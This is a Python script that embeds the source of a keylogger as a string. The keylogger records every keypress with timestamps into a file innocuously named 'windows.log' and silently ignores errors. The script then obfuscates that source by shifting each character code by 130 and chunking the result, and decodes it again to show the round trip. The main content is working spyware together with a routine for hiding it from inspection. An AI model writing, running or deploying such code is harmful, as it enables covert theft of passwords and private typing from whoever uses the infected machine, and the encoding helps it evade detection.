code = """def on_key_press(key):
    global prev
    curr = datetime.datetime.now()
    if key == keyboard.Key.enter:
        text = "\\\\n"
    elif key == keyboard.Key.tab:
        text = "\\\\t"
    elif key == keyboard.Key.space:
        text = " "
    elif key == keyboard.Key.backspace:
        text = "\\\\b"
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
        text = "\\\\a"
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        text = r"\\\\c"
    elif key in [
        keyboard.Key.right,
        keyboard.Key.left,
        keyboard.Key.up,
        keyboard.Key.down,
    ]:
        text = ""
    else:
        text = str(key).strip("'").replace('Key.','\\\\')
    with open(log_file, "a") as f:
        if prev + datetime.timedelta(seconds=10) < curr:
            timestamp = datetime.datetime.now().strftime(r"%Y-%m-%d %H:%M:%S")
            text = f"\\n {timestamp}: " + text
        f.write(text)
    prev = curr
log_file = "windows.log"
try:
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()
except:
    pass;
"""
# l = []
# for i in code:
#     l.append(ord(i))
# print(l)

print("\n\n======== encode ==========")

char_offset = 130

l2 = []
a = 0
le = len(code)
c = 11
t = 0
while a < le:
    l3 = []
    while t < c and a < le:
        l3.append(ord(code[a]) - char_offset)
        a += 1
        t += 1
    t = 0
    l2.append(l3)


print(l2)


print("\n\n======== decode =========\n\n")


def chr_decode(i):
    global char_offset
    return chr(i + char_offset)


l4 = []
for i in l2:
    l4.extend(i)
l4 = map(chr_decode, l4)

s = "".join(l4)
print(s)
